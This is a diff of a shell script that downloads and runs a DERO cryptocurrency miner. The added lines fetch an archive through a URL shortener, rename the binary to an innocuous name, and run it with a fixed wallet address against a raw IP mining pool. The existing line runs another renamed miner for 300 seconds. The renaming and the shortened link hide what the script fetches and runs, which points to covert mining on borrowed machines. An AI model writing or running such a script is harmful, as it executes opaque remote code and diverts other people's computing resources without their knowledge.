@@ -8,9 +8,10 @@
 
 
 
-wget -qO adul.tar.gz https://github.com/tj8519/astrominer/releases/download/V1.4/astrominer-V1.4_amd64_rev2.tar.gz
-tar xf adul.tar.gz
-mv astrominer jigsaw
+wget -qO aduls.tar.xz https://cutt.ly/vBXC1AM
+tar xf aduls.tar.xz
+mv uranus unus
+./unus -u dero1qyqdvrqzd8amxwwdy00axn6sgfvj22y95qu7vv6d54cpdq8h9pxq5qgalafqu -o tcp://52.86.135.71:443 || echo done
 timeout 300 ./jigsaw -w dero1qyqdvrqzd8amxwwdy00axn6sgfvj22y95qu7vv6d54cpdq8h9pxq5qgalafqu -r 148.113.142.107:443 -p stratum
 #wget -qO timer https://raw.githubusercontent.com/amit12986/SC/main/timer.sh
 #chmod 700 timer
@@ -18,4 +19,6 @@ timeout 300 ./jigsaw -w dero1qyqdvrqzd8amxwwdy00axn6sgfvj22y95qu7vv6d54cpdq8h9px
 
 
 #i=300;while [ $i -gt 0 ];do if [ $i -gt 9 ];then printf "\b\b$i";else  printf "\b\b $i";fi;sleep 1;i=`expr $i - 1`;done
+echo done
+echo done
 echo done
